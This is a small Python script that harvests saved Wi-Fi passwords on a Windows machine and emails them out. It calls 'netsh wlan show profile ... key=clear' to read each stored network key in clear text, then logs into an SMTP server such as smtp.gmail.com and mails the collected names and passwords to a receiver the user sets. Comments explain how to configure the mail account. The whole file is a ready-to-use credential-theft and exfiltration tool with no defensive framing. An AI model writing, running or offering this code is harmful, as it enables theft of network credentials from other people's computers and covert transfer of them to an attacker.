import smtplib
import subprocess
import re

# Getting the Wifi names
wifi_names = subprocess.check_output("netsh wlan show profile")
wifi_names = str(wifi_names)
wifi_names = re.findall("All User Profile     : .*", wifi_names)[0]
wifi_names = wifi_names.split(":")[1:]
wifiNames = []
for name in wifi_names:
    string = name.split("\\r")[0]
    string = string.strip()
    wifiNames.append(string)

content = []

# Getting the Wifi Passwords
for wifi in wifiNames:
    data = subprocess.check_output("netsh wlan show profile \"{}\" key=clear".format(wifi))
    data = str(data)
    name = data.split("nProfile ")[1]
    name = name.split("on")[0]
    password = data.split("Key Content            :")[1]
    password = password.split("\\r\\n")[0].strip()
    content.append((name, password))
content = str(content)

# Uploading Data
mail = smtplib.SMTP('smtp.gmail.com', 587) # Change the 'gmail' part to whatever email you are using, if you are using yahoo use 'smtp.yahoo.com'
mail.ehlo()
mail.starttls()
mail.login('email', 'password') # You should enter your email and password here
mail.sendmail('sender', 'receiver', content) # The sender should be the same as the email you entered above, and the receiver is the email you wish to receive the data from
mail.close()
